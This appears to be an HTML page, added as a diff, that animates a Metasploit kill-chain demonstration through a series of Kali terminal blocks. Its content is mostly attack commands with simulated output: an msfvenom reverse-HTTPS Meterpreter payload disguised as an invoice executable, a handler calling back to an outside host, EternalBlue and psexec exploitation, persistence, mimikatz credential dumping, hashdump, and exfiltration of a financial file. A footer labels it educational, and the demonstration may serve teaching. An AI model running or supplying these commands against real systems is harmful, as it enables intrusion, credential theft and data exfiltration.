@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ Metasploit Attack Path - Cyber Kill Chain</title>
+    <style>
+        :root {
+            --hacker-green: #00ff41;
+            --matrix-green: #008f11;
+            --terminal-bg: #0a0e12;
+            --accent-blue: #00c8ff;
+            --warning-orange: #ff8c00;
+            --danger-red: #ff3333;
+        }
+        
+        body {
+            background-color: var(--terminal-bg);
+            color: var(--hacker-green);
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 255, 65, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(0, 200, 255, 0.05) 0%, transparent 20%);
+            line-height: 1.6;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        h1 {
+            color: var(--accent-blue);
+            font-size: 2.5rem;
+            text-shadow: 0 0 10px rgba(0, 200, 255, 0.5);
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        
+        .subtitle {
+            color: var(--matrix-green);
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 25px;
+            max-width: 900px;
+            margin: auto;
+        }
+        
+        .stage {
+            display: flex;
+            align-items: flex-start;
+            background: rgba(20, 25, 30, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 200, 255, 0.3);
+            width: 100%;
+            transition: all 0.3s ease;
+            border-left: 4px solid var(--accent-blue);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stage:hover {
+            transform: translateX(5px);
+            box-shadow: 0 0 20px rgba(0, 200, 255, 0.6);
+        }
+        
+        .stage::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.05), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .stage:hover::before {
+            opacity: 1;
+        }
+        
+        .stage-icon {
+            width: 50px;
+            height: 50px;
+            margin-right: 20px;
+            filter: drop-shadow(0 0 5px var(--accent-blue));
+        }
+        
+        .info {
+            flex: 1;
+            text-align: left;
+        }
+        
+        .title {
+            color: var(--accent-blue);
+            font-size: 1.3rem;
+            font-weight: bold;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .title::before {
+            content: '➜';
+            color: var(--hacker-green);
+            margin-right: 10px;
+            font-size: 1.1rem;
+        }
+        
+        .description {
+            color: #bbbbbb;
+            font-size: 0.95rem;
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+        
+        .terminal {
+            background: rgba(10, 15, 20, 0.9);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 6px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+        }
+        
+        .terminal-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 6px;
+            cursor: pointer;
+        }
+        
+        .btn-red { background: var(--danger-red); }
+        .btn-yellow { background: var(--warning-orange); }
+        .btn-green { background: var(--matrix-green); }
+        
+        .terminal-title {
+            margin-left: 10px;
+            color: var(--accent-blue);
+            font-size: 0.8rem;
+            flex-grow: 1;
+        }
+        
+        .command, .output {
+            color: var(--hacker-green);
+            white-space: pre-wrap;
+            word-break: break-all;
+            line-height: 1.5;
+            overflow: hidden;
+            position: relative;
+            display: none; /* Initially hidden */
+        }
+        
+        .command::before {
+            content: 'msf6 > ';
+            color: var(--warning-orange);
+        }
+        
+        .meterpreter::before {
+            content: 'meterpreter > ';
+            color: var(--danger-red);
+        }
+        
+        .output {
+            color: #aaaaaa;
+            margin-top: 5px;
+            font-style: italic;
+            white-space: pre-wrap;
+        }
+        
+        .typing-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background-color: var(--hacker-green);
+            margin-left: 2px;
+            vertical-align: middle;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .footer {
+            margin-top: 40px;
+            color: var(--matrix-green);
+            font-size: 0.9rem;
+            text-align: center;
+        }
+        
+        /* Playback controls */
+        .playback-controls {
+            display: flex;
+            gap: 8px;
+            margin-left: 10px;
+        }
+        
+        .playback-btn {
+            background: rgba(0, 200, 255, 0.2);
+            border: 1px solid var(--accent-blue);
+            color: var(--accent-blue);
+            border-radius: 4px;
+            padding: 2px 8px;
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .playback-btn:hover {
+            background: rgba(0, 200, 255, 0.4);
+        }
+        
+        .playback-btn:active {
+            transform: scale(0.95);
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .stage {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .stage-icon {
+                margin-bottom: 15px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .playback-controls {
+                margin-left: 5px;
+                gap: 5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>⚡ METASPLOIT CYBER KILL CHAIN</h1>
+        <div class="subtitle">Tracking the adversary's attack path through realistic scenarios</div>
+    </div>
+    
+    <div class="container">
+        <!-- Reconnaissance -->
+        <div class="stage">
+            <img src="https://img.icons8.com/ios-filled/50/00c8ff/binoculars.png" class="stage-icon" alt="Reconnaissance">
+            <div class="info">
+                <div class="title">Reconnaissance</div>
+                <div class="description">Identifying potential targets through network scanning and service enumeration. Gathering intelligence about the target environment.</div>
+                
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn btn-red"></div>
+                        <div class="terminal-btn btn-yellow"></div>
+                        <div class="terminal-btn btn-green"></div>
+                        <div class="terminal-title">Kali Linux - Terminal</div>
+                        <div class="playback-controls">
+                            <button class="playback-btn" onclick="playTerminal(this)">▶ Play</button>
+                            <button class="playback-btn" onclick="pauseTerminal(this)">⏸ Pause</button>
+                            <button class="playback-btn" onclick="continueTerminal(this)">⏵ Continue</button>
+                            <button class="playback-btn" onclick="stopTerminal(this)">⏹ Stop</button>
+                        </div>
+                    </div>
+                    <div class="command">db_nmap -sV -T4 -O --top-ports 100 192.168.1.0/24</div>
+                    <div class="output">
+[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-15 14:00 UTC
+[*] Nmap: Nmap scan report for 192.168.1.105
+[*] Nmap: Host is up (0.045s latency).
+[*] Nmap: PORT     STATE SERVICE       VERSION
+[*] Nmap: 445/tcp  open  microsoft-ds  Windows 10 Pro 19042 microsoft-ds
+[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
+                    </div>
+                    <div class="command">services -c port,proto,name,info -S smb</div>
+                    <div class="output">
+Services
+========
+host          port  proto  name       info
+----          ----  -----  ----       ----
+192.168.1.105 445   tcp    microsoft  Windows 10 Pro 19042 microsoft-ds
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Weaponization -->
+        <div class="stage">
+            <img src="https://img.icons8.com/ios-filled/50/ff0000/biohazard.png" class="stage-icon" alt="Weaponization">
+            <div class="info">
+                <div class="title">Weaponization</div>
+                <div class="description">Creating tailored payloads based on reconnaissance data. Crafting exploits for identified vulnerabilities.</div>
+                
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn btn-red"></div>
+                        <div class="terminal-btn btn-yellow"></div>
+                        <div class="terminal-btn btn-green"></div>
+                        <div class="terminal-title">Kali Linux - Terminal</div>
+                        <div class="playback-controls">
+                            <button class="playback-btn" onclick="playTerminal(this)">▶ Play</button>
+                            <button class="playback-btn" onclick="pauseTerminal(this)">⏸ Pause</button>
+                            <button class="playback-btn" onclick="continueTerminal(this)">⏵ Continue</button>
+                            <button class="playback-btn" onclick="stopTerminal(this)">⏹ Stop</button>
+                        </div>
+                    </div>
+                    <div class="command">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 -f exe -o invoice_update.exe -i 3 -e x64/shikata_ga_nai</div>
+                    <div class="output">
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 3 iterations of x64/shikata_ga_nai
+x64/shikata_ga_nai succeeded with size 694 (iteration=0)
+x64/shikata_ga_nai succeeded with size 761 (iteration=1)
+x64/shikata_ga_nai succeeded with size 828 (iteration=2)
+Payload size: 828 bytes
+Final size of exe file: 7168 bytes
+Saved as: invoice_update.exe
+                    </div>
+                    <div class="command">python3 -m http.server 80</div>
+                    <div class="output">
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Delivery -->
+        <div class="stage">
+            <img src="https://img.icons8.com/ios-filled/50/ffa500/mail.png" class="stage-icon" alt="Delivery">
+            <div class="info">
+                <div class="title">Delivery</div>
+                <div class="description">Executing the delivery mechanism to get the payload to the target. Setting up infrastructure for callback.</div>
+                
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn btn-red"></div>
+                        <div class="terminal-btn btn-yellow"></div>
+                        <div class="terminal-btn btn-green"></div>
+                        <div class="terminal-title">Kali Linux - Terminal</div>
+                        <div class="playback-controls">
+                            <button class="playback-btn" onclick="playTerminal(this)">▶ Play</button>
+                            <button class="playback-btn" onclick="pauseTerminal(this)">⏸ Pause</button>
+                            <button class="playback-btn" onclick="continueTerminal(this)">⏵ Continue</button>
+                            <button class="playback-btn" onclick="stopTerminal(this)">⏹ Stop</button>
+                        </div>
+                    </div>
+                    <div class="command">use exploit/multi/handler</div>
+                    <div class="command">set PAYLOAD windows/x64/meterpreter/reverse_https</div>
+                    <div class="command">set LHOST 10.0.0.5</div>
+                    <div class="command">set LPORT 443</div>
+                    <div class="command">set ExitOnSession false</div>
+                    <div class="command">set AutoRunScript post/windows/manage/migrate</div>
+                    <div class="command">exploit -j</div>
+                    <div class="output">
+[*] Exploit running as background job 0.
+[*] Started HTTPS reverse handler on https://10.0.0.5:443
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Exploitation -->
+        <div class="stage">
+            <img src="https://img.icons8.com/ios-filled/50/ff0000/cyber-security.png" class="stage-icon" alt="Exploitation">
+            <div class="info">
+                <div class="title">Exploitation</div>
+                <div class="description">Triggering the vulnerability to execute arbitrary code on the target system.</div>
+                
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn btn-red"></div>
+                        <div class="terminal-btn btn-yellow"></div>
+                        <div class="terminal-btn btn-green"></div>
+                        <div class="terminal-title">Kali Linux - Terminal</div>
+                        <div class="playback-controls">
+                            <button class="playback-btn" onclick="playTerminal(this)">▶ Play</button>
+                            <button class="playback-btn" onclick="pauseTerminal(this)">⏸ Pause</button>
+                            <button class="playback-btn" onclick="continueTerminal(this)">⏵ Continue</button>
+                            <button class="playback-btn" onclick="stopTerminal(this)">⏹ Stop</button>
+                        </div>
+                    </div>
+                    <div class="command">use exploit/windows/smb/ms17_010_eternalblue</div>
+                    <div class="command">set RHOSTS 192.168.1.105</div>
+                    <div class="command">set PAYLOAD windows/x64/meterpreter/reverse_https</div>
+                    <div class="command">set LHOST 10.0.0.5</div>
+                    <div class="command">set LPORT 443</div>
+                    <div class="command">exploit</div>
+                    <div class="output">
+[*] 192.168.1.105:445 - Connecting to target for exploitation.
+[*] 192.168.1.105:445 - Target OS: Windows 10 Pro 19042
+[*] 192.168.1.105:445 - Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.105[\svcctl] ...
+[*] 192.168.1.105:445 - Sending exploit ...
+[*] 192.168.1.105:445 - Exploit completed, but no session was created.
+                    </div>
+                    <div class="command">use exploit/windows/smb/psexec</div>
+                    <div class="command">set RHOSTS 192.168.1.105</div>
+                    <div class="command">set SMBUser jsmith</div>
+                    <div class="command">set SMBPass Summer2023!</div>
+                    <div class="command">set PAYLOAD windows/x64/meterpreter/reverse_https</div>
+                    <div class="command">exploit</div>
+                    <div class="output">
+[*] Started HTTPS reverse handler on https://10.0.0.5:443
+[*] 192.168.1.105:445 - Connecting to the server...
+[*] 192.168.1.105:445 - Authenticating to 192.168.1.105:445 as user 'jsmith'...
+[*] 192.168.1.105:445 - Selecting PowerShell target
+[*] 192.168.1.105:445 - Executing the payload...
+[+] 192.168.1.105:445 - Service start timed out, OK if running a command or non-service executable...
+[*] https://10.0.0.5:443 handling request from 192.168.1.105; (UUID: abc123) Staging x64 payload (201308 bytes) ...
+[*] Meterpreter session 1 opened (10.0.0.5:443 -> 192.168.1.105:49675)
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Installation -->
+        <div class="stage">
+            <img src="https://img.icons8.com/ios/50/ffa500/download.png" class="stage-icon" alt="Installation">
+            <div class="info">
+                <div class="title">Installation</div>
+                <div class="description">Establishing persistence and maintaining access to the compromised system.</div>
+                
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn btn-red"></div>
+                        <div class="terminal-btn btn-yellow"></div>
+                        <div class="terminal-btn btn-green"></div>
+                        <div class="terminal-title">Kali Linux - Terminal</div>
+                        <div class="playback-controls">
+                            <button class="playback-btn" onclick="playTerminal(this)">▶ Play</button>
+                            <button class="playback-btn" onclick="pauseTerminal(this)">⏸ Pause</button>
+                            <button class="playback-btn" onclick="continueTerminal(this)">⏵ Continue</button>
+                            <button class="playback-btn" onclick="stopTerminal(this)">⏹ Stop</button>
+                        </div>
+                    </div>
+                    <div class="command meterpreter">getuid</div>
+                    <div class="output">
+Server username: CORP\jsmith
+                    </div>
+                    <div class="command meterpreter">sysinfo</div>
+                    <div class="output">
+Computer        : WIN10-WORKSTATION
+OS              : Windows 10 (10.0 Build 19042).
+Architecture    : x64
+System Language : en_US
+Domain          : CORP
+Logged On Users : 3
+Meterpreter     : x64/windows
+                    </div>
+                    <div class="command meterpreter">run post/windows/manage/migrate</div>
+                    <div class="output">
+[*] Running module against WIN10-WORKSTATION
+[*] Current server process: svchost.exe (1844)
+[*] Spawning notepad.exe process to migrate to
+[+] Successfully migrated to process 3652
+                    </div>
+                    <div class="command meterpreter">run persistence -U -i 60 -p 443 -r 10.0.0.5</div>
+                    <div class="output">
+[*] Running Persistence Script
+[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN10-WORKSTATION_20230515.1234.rc
+[*] Creating Payload=windows/x64/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443
+[*] Persistent agent script is 9966 bytes long
+[+] Persistent Script written to C:\Users\jsmith\AppData\Local\Temp\default.exe
+[*] Executing script C:\Users\jsmith\AppData\Local\Temp\default.exe
+[+] Agent executed with PID 4128
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Command & Control -->
+        <div class="stage">
+            <img src="https://img.icons8.com/ios-filled/50/00ff00/remote-control.png" class="stage-icon" alt="Command & Control">
+            <div class="info">
+                <div class="title">Command & Control (C2)</div>
+                <div class="description">Establishing covert channels for remote control and data exfiltration.</div>
+                
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn btn-red"></div>
+                        <div class="terminal-btn btn-yellow"></div>
+                        <div class="terminal-btn btn-green"></div>
+                        <div class="terminal-title">Kali Linux - Terminal</div>
+                        <div class="playback-controls">
+                            <button class="playback-btn" onclick="playTerminal(this)">▶ Play</button>
+                            <button class="playback-btn" onclick="pauseTerminal(this)">⏸ Pause</button>
+                            <button class="playback-btn" onclick="continueTerminal(this)">⏵ Continue</button>
+                            <button class="playback-btn" onclick="stopTerminal(this)">⏹ Stop</button>
+                        </div>
+                    </div>
+                    <div class="command meterpreter">ipconfig</div>
+                    <div class="output">
+Interface  1
+============
+Name         : Ethernet0
+Hardware MAC : 00:50:56:b3:09:1f
+MTU         : 1500
+IPv4 Address : 192.168.1.105
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::6c5f:7a3d:9e1a:2b3c
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+                    </div>
+                    <div class="command meterpreter">portfwd add -l 3389 -p 3389 -r 192.168.1.105</div>
+                    <div class="output">
+[*] Local TCP relay created: :3389 <-> 192.168.1.105:3389
+                    </div>
+                    <div class="command meterpreter">background</div>
+                    <div class="command">sessions -i 1</div>
+                    <div class="command meterpreter">load kiwi</div>
+                    <div class="output">
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Actions on Objectives -->
+        <div class="stage">
+            <img src="https://img.icons8.com/ios-filled/50/00ff00/hacker.png" class="stage-icon" alt="Actions on Objectives">
+            <div class="info">
+                <div class="title">Actions on Objectives</div>
+                <div class="description">Executing the final attack objectives - data exfiltration, privilege escalation, or lateral movement.</div>
+                
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn btn-red"></div>
+                        <div class="terminal-btn btn-yellow"></div>
+                        <div class="terminal-btn btn-green"></div>
+                        <div class="terminal-title">Kali Linux - Terminal</div>
+                        <div class="playback-controls">
+                            <button class="playback-btn" onclick="playTerminal(this)">▶ Play</button>
+                            <button class="playback-btn" onclick="pauseTerminal(this)">⏸ Pause</button>
+                            <button class="playback-btn" onclick="continueTerminal(this)">⏵ Continue</button>
+                            <button class="playback-btn" onclick="stopTerminal(this)">⏹ Stop</button>
+                        </div>
+                    </div>
+                    <div class="command meterpreter">hashdump</div>
+                    <div class="output">
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jsmith:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+                    </div>
+                    <div class="command meterpreter">creds_all</div>
+                    <div class="output">
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username       Domain  LM                                NTLM                              SHA1
+--------       ------  --                                ----                              ----
+jsmith         CORP    e52cac67419a9a22ecb08369099ed302  8846f7eaee8fb117ad06bdd830b7586c  7a21990fcd3d759941e45c490f143d5f258f3b5a
+
+wdigest credentials
+===================
+
+Username       Domain     Password
+--------       ------     --------
+(null)         (null)     (null)
+WIN10-WORKSTATION$  WORKGROUP  (null)
+jsmith         CORP       Summer2023!
+
+tspkg credentials
+=================
+
+Username       Domain     Password
+--------       ------     --------
+jsmith         CORP       Summer2023!
+
+kerberos credentials
+====================
+
+Username       Domain     Password
+--------       ------     --------
+(null)         (null)     (null)
+WIN10-WORKSTATION$  WORKGROUP  (null)
+jsmith         CORP       Summer2023!
+                    </div>
+                    <div class="command meterpreter">download "C:\\Users\\jsmith\\Documents\\financial_records.xlsx"</div>
+                    <div class="output">
+[*] Downloading: C:\Users\jsmith\Documents\financial_records.xlsx -> financial_records.xlsx
+[*] Downloaded 1.95 MiB of 1.95 MiB (100.0%): C:\Users\jsmith\Documents\financial_records.xlsx -> financial_records.xlsx
+[*] download   : C:\Users\jsmith\Documents\financial_records.xlsx -> financial_records.xlsx
+                    </div>
+                    <div class="command meterpreter">shell</div>
+                    <div class="command">whoami /all</div>
+                    <div class="output">
+USER INFORMATION
+----------------
+
+User Name      SID
+============== ============================================
+corp\jsmith    S-1-5-21-3874928736-367528774-1298337465-1103
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div>⚠ For educational purposes only. Always obtain proper authorization before testing security controls.</div>
+        <div class="typing-cursor"></div>
+    </div>
+
+    <script>
+        // Store animation state for each terminal
+        const terminalStates = new WeakMap();
+        
+        // Play terminal animation from beginning
+        function playTerminal(button) {
+            const terminal = button.closest('.terminal');
+            stopTerminal(button); // Reset first
+            startTerminalAnimation(terminal);
+        }
+        
+        // Continue terminal animation from where it was paused
+        function continueTerminal(button) {
+            const terminal = button.closest('.terminal');
+            const state = terminalStates.get(terminal);
+            
+            if (state && !state.playing) {
+                state.playing = true;
+                showNextElement(terminal);
+            }
+        }
+        
+        // Pause terminal animation
+        function pauseTerminal(button) {
+            const terminal = button.closest('.terminal');
+            const state = terminalStates.get(terminal);
+            
+            if (state) {
+                state.playing = false;
+            }
+        }
+        
+        // Stop terminal animation and reset
+        function stopTerminal(button) {
+            const terminal = button.closest('.terminal');
+            const commands = terminal.querySelectorAll('.command, .output');
+            const state = terminalStates.get(terminal);
+            
+            if (state) {
+                // Clear all timeouts
+                state.timeouts.forEach(timeoutId => clearTimeout(timeoutId));
+                state.timeouts = [];
+                state.playing = false;
+                state.currentIndex = 0;
+            }
+            
+            // Reset all commands and outputs
+            commands.forEach(cmd => {
+                cmd.style.display = 'none';
+                cmd.textContent = cmd.dataset.originalText || cmd.textContent;
+                
+                // Remove any cursors
+                const cursor = cmd.querySelector('.typing-cursor');
+                if (cursor) {
+                    cmd.removeChild(cursor);
+                }
+            });
+        }
+        
+        // Initialize terminal animation
+        function startTerminalAnimation(terminal) {
+            const commands = terminal.querySelectorAll('.command, .output');
+            
+            // Initialize terminal state
+            terminalStates.set(terminal, {
+                currentIndex: 0,
+                playing: true,
+                timeouts: []
+            });
+            
+            // Start the animation
+            showNextElement(terminal);
+        }
+        
+        // Show next element in sequence
+        function showNextElement(terminal) {
+            const state = terminalStates.get(terminal);
+            const commands = terminal.querySelectorAll('.command, .output');
+            
+            if (state.currentIndex >= commands.length || !state.playing) {
+                return;
+            }
+            
+            const element = commands[state.currentIndex];
+            element.style.display = 'block';
+            
+            // Store original content
+            const originalText = element.textContent;
+            element.textContent = '';
+            
+            // Add cursor to the element
+            const cursor = document.createElement('span');
+            cursor.className = 'typing-cursor';
+            element.appendChild(cursor);
+            
+            // Start typing effect
+            let i = 0;
+            const typingSpeed = getTypingSpeed(element.classList.contains('command') ? 30 : 10);
+            
+            function typeCharacter() {
+                if (i < originalText.length && state.playing) {
+                    // Insert character before cursor
+                    const char = originalText.charAt(i);
+                    element.insertBefore(document.createTextNode(char), cursor);
+                    i++;
+                    
+                    // Random delay to simulate human typing
+                    const delay = typingSpeed + Math.random() * 50;
+                    const timeoutId = setTimeout(typeCharacter, delay);
+                    state.timeouts.push(timeoutId);
+                } else {
+                    // Remove cursor when done
+                    element.removeChild(cursor);
+                    state.currentIndex++;
+                    
+                    // Small delay before next element
+                    const timeoutId = setTimeout(() => showNextElement(terminal), 500);
+                    state.timeouts.push(timeoutId);
+                }
+            }
+            
+            // Start typing
+            typeCharacter();
+        }
+        
+        // Get typing speed based on element type (command or output)
+        function getTypingSpeed(isCommand) {
+            // Commands are typed faster than output (simulating hacker typing commands quickly)
+            return isCommand ? 10 + Math.random() * 20 : 30 + Math.random() * 50;
+        }
+        
+        // Store original text in data attribute for reset
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.command, .output').forEach(el => {
+                el.dataset.originalText = el.textContent;
+            });
+        });
+    </script>
+</body>
+</html>
